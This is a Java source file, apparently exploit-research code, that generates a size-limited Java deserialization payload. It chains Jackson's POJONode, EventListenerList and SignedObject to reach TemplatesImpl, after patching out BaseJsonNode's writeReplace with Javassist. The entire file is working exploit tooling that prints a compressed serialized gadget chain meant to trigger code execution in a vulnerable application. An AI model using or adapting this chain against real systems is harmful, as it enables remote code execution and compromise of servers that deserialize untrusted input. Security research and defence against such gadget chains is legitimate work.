package com.jdkunser;

import com.example.Utils;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.swing.event.EventListenerList;
import java.security.SignedObject;

import static com.example.Gadget_Event2toString.getEventListenerList;
import static com.example.Module_SecondSer.second_serialize;


public class DoubleShortEventChain {
    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();
        TemplatesImpl obj = Utils.getTemplatesImpl();
        while(true) {
            POJONode pojonode = new POJONode(obj);
            EventListenerList eventListenerList = getEventListenerList(pojonode);

            SignedObject signedObject = second_serialize(eventListenerList);
            POJONode pojoNode2 = new POJONode(signedObject);
            EventListenerList eventListenerList2 = getEventListenerList(pojoNode2);

            String barr = Utils.deflaterSerialize(eventListenerList2);
            System.out.println(barr);
            System.out.println(barr.length());
            if (barr.length()<=1284){
                break;
            }
        }
    }
}